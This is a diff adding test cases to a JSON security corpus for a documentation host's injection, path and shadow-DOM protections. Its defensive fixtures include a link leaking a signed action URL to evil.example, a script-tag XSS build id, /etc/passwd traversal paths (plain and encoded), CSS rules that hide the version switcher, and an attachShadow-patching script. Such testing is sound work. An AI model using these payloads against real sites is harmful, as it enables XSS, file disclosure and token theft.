@@ -2141,6 +2141,243 @@
       "payload": "Please [confirm](https://evil.example/?u={action_url}) your account.",
       "expect": "unsafe_link_target",
       "note": "🛑 Found while asserting that a placeholder MAY be a whole link target. Four of five hostile spellings were refused by the shape rules and this one was not: it is a perfectly valid https:// URL, so substitution would have delivered DocUp's own action URL to a host the tenant chose. An action URL is a CAPABILITY — a signed, one-time link that acts on the recipient's behalf — so this is a disclosure control, not tidiness. A placeholder is now a whole target or none of one; in link text it is still just text."
+    },
+    {
+      "id": "addons-001",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a head whose script holds the literal string \"</head>\"",
+      "document": "<!doctype html><html><head><script>var s = \"</head>\";</script></head><body>page</body></html>",
+      "assert_after_raw_text": true,
+      "expect": "injected",
+      "note": "🛑 Found by writing this corpus, and it was a REAL defect. The plain §8.15.3 pattern inserted the two tags inside the JavaScript string literal and the `</script>` in the loader tag then terminates the script element, so the rest leaked into the page as markup and `\";` as text. The document was visibly broken and the coverage record said `injected`. The scan now skips raw-text elements, so the tags land after `</script>`."
+    },
+    {
+      "id": "addons-002",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a head whose HTML comment holds the literal \"</head>\"",
+      "document": "<!doctype html><html><head><!-- </head> --></head><body>page</body></html>",
+      "assert_after_raw_text": true,
+      "expect": "injected",
+      "note": "🛑 The second half of the same defect and the worse one: the tags landed inside the comment, so the loader never ran, chrome was SILENTLY absent, and the record still said `injected`. A lie in the audit trail is worse than visible breakage, because nobody goes looking for it."
+    },
+    {
+      "id": "addons-003",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a head whose only \"</head>\" is inside a script",
+      "document": "<!doctype html><html><head><script>\"</head>\"</script><body>page</body></html>",
+      "unchanged": true,
+      "expect": "refused_no_head",
+      "note": "🛑 There is no SAFE insertion point, so §8.15.4 applies: refused, warned about, and published without chrome. Published broken is the other choice and it is not one §8.15.4 offers."
+    },
+    {
+      "id": "addons-004",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "an element whose name begins with script: <scripture-notes>",
+      "document": "<!doctype html><html><head><scripture-notes></scripture-notes></head><body>p</body></html>",
+      "expect": "injected",
+      "note": "A fixed-string search for `<script` would read this as a script element and skip the rest of the document, so a documentation site about scripture would lose its chrome. The scan requires a character that may follow a tag name."
+    },
+    {
+      "id": "addons-005",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "an unterminated HTML comment swallowing the rest of the document",
+      "document": "<!doctype html><html><head><!-- </head><body>page</body></html>",
+      "unchanged": true,
+      "expect": "refused_no_head",
+      "note": "The scan runs to the end rather than guessing where the comment was meant to close. A browser sees no head here either, so refusing matches what a reader would get."
+    },
+    {
+      "id": "addons-006",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.4",
+      "input": "a document that is valid Shift-JIS and not valid UTF-8",
+      "builder": "shiftJisDocument",
+      "unchanged": true,
+      "expect": "refused_non_utf8",
+      "note": "🛑 §8.15.4: refused rather than injected \"even though inserting ASCII bytes would appear to work, because the document own charset declaration cannot be trusted without parsing and a mis-declared charset is an XSS vector\"."
+    },
+    {
+      "id": "addons-007",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.4",
+      "input": "a document over the configured byte ceiling",
+      "builder": "oversizedDocument",
+      "unchanged": true,
+      "expect": "refused_too_large",
+      "note": "Checked before anything else, because every other step holds the whole document in memory. The bytes are stored exactly as they were built."
+    },
+    {
+      "id": "addons-008",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a navigational stub: no head, body is only a location assignment",
+      "document": "<html><body><script>location.replace(\"en/latest/\")</script></body></html>",
+      "unchanged": true,
+      "expect": "skipped_stub",
+      "note": "🛑 ADR 0002: recorded and deliberately NOT warned about. \"Every Antora site warns on every build forever and operators learn to ignore injection warnings.\" The exemption is part of the control rather than a softening of it."
+    },
+    {
+      "id": "addons-009",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a redirect page that also carries real prose",
+      "document": "<html><body><script>location=\"en/latest/\"</script><h1>Moved</h1><p>The release notes for every version are now published under their own version prefix, and this page only redirects.</p></body></html>",
+      "unchanged": true,
+      "expect": "refused_no_head",
+      "note": "🛑 The stub exemption must NOT swallow a real page. This redirects AND says something, so it is a document: it warns, which is the whole point of the size and text bounds on the exemption."
+    },
+    {
+      "id": "addons-010",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.1",
+      "input": "a build identifier carrying markup instead of a UUID",
+      "document": "<!doctype html><html><head></head><body>p</body></html>",
+      "build_id": "\"><script>alert(1)</script>",
+      "assert_escaped": true,
+      "expect": "injected",
+      "note": "🛑 The build id is escaped even though it is always a UUID. It arrives as a string from a caller, and \"always a UUID\" is the assumption that holds until something passes user input, at which point this is an injection point into every page of a documentation site."
+    },
+    {
+      "id": "addons-011",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "an upper-case </HEAD> with no lower-case equivalent",
+      "document": "<!doctype html><html><HEAD></HEAD><body>p</body></html>",
+      "expect": "injected",
+      "note": "§8.15.3 names this as a FALSE FAILURE a naive search produces on a valid document rather than as an attack: \"`</HEAD>` and `</head >` are both legal and both occur\"."
+    },
+    {
+      "id": "addons-012",
+      "category": "addons",
+      "subject": "injection",
+      "defends": "8.15.3",
+      "input": "a CDATA section holding the literal \"</head>\"",
+      "document": "<html><head><![CDATA[ </head> ]]></head><body>p</body></html>",
+      "assert_after_raw_text": true,
+      "expect": "injected",
+      "note": "XHTML output carries CDATA sections and their contents are not markup. The scan skips them for the same reason it skips a comment."
+    },
+    {
+      "id": "addons-013",
+      "category": "addons",
+      "subject": "addons_path",
+      "defends": "8.9.6",
+      "input": "/en/v1/../../etc/passwd",
+      "expect": "reject",
+      "note": "🛑 The `path` parameter decides which version the payload describes, so it is an authorisation subject. §8.9.6 canonical form is applied to it: the middleware that normally enforces it ran against `/_/addons`, not against this parameter."
+    },
+    {
+      "id": "addons-014",
+      "category": "addons",
+      "subject": "addons_path",
+      "defends": "8.9.6",
+      "input": "/en//v1/",
+      "expect": "reject",
+      "note": "A doubled separator is two paths for one document, which is the cache-key surface §8.9.6 spends its strictness collapsing."
+    },
+    {
+      "id": "addons-015",
+      "category": "addons",
+      "subject": "addons_path",
+      "defends": "8.9.6",
+      "input": "/en/%2e%2e/v1/",
+      "expect": "reject",
+      "note": "An encoded traversal, decoded before the canonical check: a check that ran first would pass a string the resolver then decodes."
+    },
+    {
+      "id": "addons-016",
+      "category": "addons",
+      "subject": "addons_path",
+      "defends": "8.9.4",
+      "input": "https://evil.example/en/v1/",
+      "expect": "accepted",
+      "note": "🛑 ACCEPTED, and that is the control rather than a gap. §8.9.4: the project is resolved \"solely from the TLS server name or `Host` header plus the path\", so only the path component is read and the REQUEST supplies the host. A reader who puts somebody else hostname here gets their own host project. Refusing it would look like a defence while the real defence is that the host is never read from here at all."
+    },
+    {
+      "id": "addons-017",
+      "category": "addons",
+      "subject": "addons_path",
+      "defends": "9.3.5",
+      "input": "a path parameter of four kilobytes",
+      "builder": "oversizedPath",
+      "expect": "reject",
+      "note": "§9.3.5 names 404 bursts as an abuse class and this endpoint is cheaper to call than a document. The cap is checked before any resolution rather than after."
+    },
+    {
+      "id": "addons-018",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "18.11",
+      "input": "* { display: none !important; color: #f0f !important }",
+      "css": "* { display: none !important; color: #ff00ff !important; }",
+      "expect": "chrome_survives",
+      "note": "🛑 §18.11 vectors two and three: a brute-force rule over every element, which real documentation themes do write. Chrome resets every inheritable property on `:host` with `!important`, and for the host element a shadow tree important declaration beats the document (CSS Scoping §3.4)."
+    },
+    {
+      "id": "addons-019",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "18.11",
+      "input": "docup-chrome { display: none !important; visibility: hidden !important }",
+      "css": "docup-chrome { display: none !important; visibility: hidden !important; opacity: 0 !important; }",
+      "expect": "chrome_survives",
+      "note": "🛑 The host element is the ONE element a document selector can match, so this is the attack §8.15.5 is most specifically about: hiding the version switcher."
+    },
+    {
+      "id": "addons-020",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "18.11",
+      "input": ":root { --docup-color-surface-page: #f00 !important }",
+      "css": ":root { --docup-color-surface-page: #ff0000 !important; --docup-color-text-primary: #ff0000 !important; --docup-font-body: Comic Sans MS !important; }",
+      "expect": "chrome_survives",
+      "note": "🛑 §18.11 vector two: custom properties INHERIT through a shadow boundary. Chrome does not read its tokens from the document. It re-declares every one of them on `:host` from the payload, which is §18.11 own stated consequence."
+    },
+    {
+      "id": "addons-021",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "18.11",
+      "input": "docup-chrome::part(bar) { display: none !important }",
+      "css": "docup-chrome::part(bar) { display: none !important } docup-chrome::part(switcher) { display: none !important }",
+      "expect": "chrome_survives",
+      "note": "🛑 §18.11 vector one. Nothing in the shadow tree carries a `part` attribute, so the document has no selector that reaches inside. The ABSENCE is the control: one exposed part would open exactly one hole and look harmless."
+    },
+    {
+      "id": "addons-022",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "18.11",
+      "input": "a page script patching Element.prototype.attachShadow to force mode: open",
+      "script": "const original = Element.prototype.attachShadow; Element.prototype.attachShadow = function (init) { return original.call(this, { ...init, mode: \"open\" }) }",
+      "expect": "chrome_refuses",
+      "note": "🛑 Documentation JavaScript runs BEFORE a deferred script, so it can hand the runtime an open root and every §8.15.5 guarantee would be gone silently. The realm cannot be recovered once patched, because same-origin script owns it, so the runtime verifies the root is closed and renders NOTHING when it is not. A visible absence instead of a switcher somebody else controls."
+    },
+    {
+      "id": "addons-023",
+      "category": "addons",
+      "subject": "chrome_css",
+      "defends": "8.15.5",
+      "input": "a page script walking the DOM for the version switcher",
+      "script": "window.__docupProbe = document.querySelectorAll(\"[data-docup-switcher], [role=listbox]\").length",
+      "expect": "chrome_survives",
+      "note": "🛑 §18.11 vector four. A closed root makes `element.shadowRoot` null, the runtime keeps it in a module-scoped WeakMap and exposes nothing on `window`, so there is no route from the page to the switcher at all."
     }
   ]
 }
